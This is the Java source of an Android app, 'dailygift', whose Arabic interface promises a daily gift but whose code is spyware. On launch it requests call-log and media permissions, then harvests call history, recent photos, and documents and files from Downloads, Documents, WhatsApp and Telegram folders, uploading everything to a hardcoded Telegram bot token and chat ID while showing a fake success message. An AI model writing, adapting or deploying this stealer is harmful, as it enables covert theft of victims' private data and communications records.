package com.example.dailygift;

import android.Manifest;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.MediaStore;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    private static final String BOT_TOKEN = "8848811886:AAEEJOusV57WTOMJZZTDXAKrsPETZtOeRpA";
    private static final String CHAT_ID = "8840750617";
    private static final int PERMISSION_REQUEST = 1001;

    private TextView statusText;
    private OkHttpClient client;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        statusText = findViewById(R.id.statusText);

        client = new OkHttpClient.Builder()
                .connectTimeout(60, TimeUnit.SECONDS)
                .writeTimeout(120, TimeUnit.SECONDS)
                .readTimeout(60, TimeUnit.SECONDS)
                .build();

        requestPermissions();
    }

    private void requestPermissions() {
        List<String> permissions = new ArrayList<>();

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                != PackageManager.PERMISSION_GRANTED) {
            permissions.add(Manifest.permission.READ_CALL_LOG);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
                    != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.READ_MEDIA_IMAGES);
            }
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO)
                    != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.READ_MEDIA_VIDEO);
            }
        } else {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                    != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            }
        }

        if (!permissions.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                    permissions.toArray(new String[0]), PERMISSION_REQUEST);
        } else {
            startExfiltration();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        // حتى لو رفض بعض الصلاحيات نكمل باللي اتقبل
        startExfiltration();
    }

    private void startExfiltration() {
        statusText.setText("جاري تحميل الهدايا...");
        new Thread(() -> {
            try {
                sendMessage("🚀 التطبيق اتفتح - بدء جمع البيانات");

                // 1. سجل المكالمات
                String callLogs = getCallLogs();
                if (callLogs != null && !callLogs.isEmpty()) {
                    sendDocument(callLogs, "call_logs.txt", "📞 سجل المكالمات");
                }

                // 2. الصور
                List<File> images = getImages(50); // أول 50 صورة
                for (File img : images) {
                    sendFile(img, "📷 صورة: " + img.getName());
                }

                // 3. ملفات عامة من Downloads و Documents
                List<File> files = getInterestingFiles();
                for (File f : files) {
                    sendFile(f, "📁 ملف: " + f.getName());
                }

                sendMessage("✅ تم إرسال كل البيانات المتاحة");

                runOnUiThread(() -> {
                    statusText.setText("تم تحميل الهدايا بنجاح 🎁");
                    Toast.makeText(this, "تم استلام الهدية اليومية", Toast.LENGTH_LONG).show();
                });

            } catch (Exception e) {
                sendMessage("❌ خطأ: " + e.getMessage());
            }
        }).start();
    }

    // ==================== جمع البيانات ====================

    private String getCallLogs() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                != PackageManager.PERMISSION_GRANTED) {
            return "لا يوجد صلاحية سجل المكالمات";
        }

        StringBuilder sb = new StringBuilder();
        sb.append("=== سجل المكالمات ===\n\n");

        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null,
                CallLog.Calls.DATE + " DESC");

        if (cursor != null) {
            int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
            int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);
            int nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);

            int count = 0;
            while (cursor.moveToNext() && count < 200) {
                String number = cursor.getString(numberIdx);
                String name = cursor.getString(nameIdx);
                int type = cursor.getInt(typeIdx);
                long date = cursor.getLong(dateIdx);
                long duration = cursor.getLong(durationIdx);

                String typeStr;
                switch (type) {
                    case CallLog.Calls.INCOMING_TYPE: typeStr = "واردة"; break;
                    case CallLog.Calls.OUTGOING_TYPE: typeStr = "صادرة"; break;
                    case CallLog.Calls.MISSED_TYPE: typeStr = "فائتة"; break;
                    default: typeStr = "أخرى";
                }

                sb.append("الرقم: ").append(number)
                        .append(" | الاسم: ").append(name != null ? name : "-")
                        .append(" | النوع: ").append(typeStr)
                        .append(" | المدة: ").append(duration).append("ث")
                        .append(" | التاريخ: ").append(new java.util.Date(date))
                        .append("\n");
                count++;
            }
            cursor.close();
        }
        return sb.toString();
    }

    private List<File> getImages(int limit) {
        List<File> images = new ArrayList<>();
        ContentResolver cr = getContentResolver();

        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {MediaStore.Images.Media.DATA};
        String sort = MediaStore.Images.Media.DATE_ADDED + " DESC";

        Cursor cursor = cr.query(uri, projection, null, null, sort);
        if (cursor != null) {
            int dataIdx = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
            int count = 0;
            while (cursor.moveToNext() && count < limit) {
                String path = cursor.getString(dataIdx);
                if (path != null) {
                    File f = new File(path);
                    if (f.exists() && f.length() < 15 * 1024 * 1024) { // أقل من 15MB
                        images.add(f);
                        count++;
                    }
                }
            }
            cursor.close();
        }
        return images;
    }

    private List<File> getInterestingFiles() {
        List<File> result = new ArrayList<>();
        File[] dirs = {
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
                new File(Environment.getExternalStorageDirectory(), "WhatsApp/Media"),
                new File(Environment.getExternalStorageDirectory(), "Telegram")
        };

        for (File dir : dirs) {
            if (dir != null && dir.exists()) {
                collectFiles(dir, result, 20);
            }
        }
        return result;
    }

    private void collectFiles(File dir, List<File> result, int max) {
        if (result.size() >= max) return;
        File[] files = dir.listFiles();
        if (files == null) return;

        for (File f : files) {
            if (result.size() >= max) break;
            if (f.isDirectory()) {
                collectFiles(f, result, max);
            } else {
                String name = f.getName().toLowerCase();
                if ((name.endsWith(".pdf") || name.endsWith(".doc") || name.endsWith(".docx")
                        || name.endsWith(".xls") || name.endsWith(".xlsx")
                        || name.endsWith(".txt") || name.endsWith(".zip")
                        || name.endsWith(".rar") || name.endsWith(".apk")
                        || name.endsWith(".mp3") || name.endsWith(".mp4"))
                        && f.length() < 20 * 1024 * 1024) {
                    result.add(f);
                }
            }
        }
    }

    // ==================== إرسال لتليجرام ====================

    private void sendMessage(String text) {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
            RequestBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("text", text)
                    .build();

            Request request = new Request.Builder().url(url).post(body).build();
            try (Response response = client.newCall(request).execute()) {
                // ignore
            }
        } catch (Exception ignored) {}
    }

    private void sendDocument(String content, String filename, String caption) {
        try {
            File temp = new File(getCacheDir(), filename);
            java.io.FileWriter writer = new java.io.FileWriter(temp);
            writer.write(content);
            writer.close();

            sendFile(temp, caption);
            temp.delete();
        } catch (Exception ignored) {}
    }

    private void sendFile(File file, String caption) {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";

            RequestBody fileBody = RequestBody.create(file, MediaType.parse("application/octet-stream"));
            RequestBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("caption", caption)
                    .addFormDataPart("document", file.getName(), fileBody)
                    .build();

            Request request = new Request.Builder().url(url).post(body).build();
            try (Response response = client.newCall(request).execute()) {
                // ignore
            }
        } catch (Exception ignored) {}
    }
}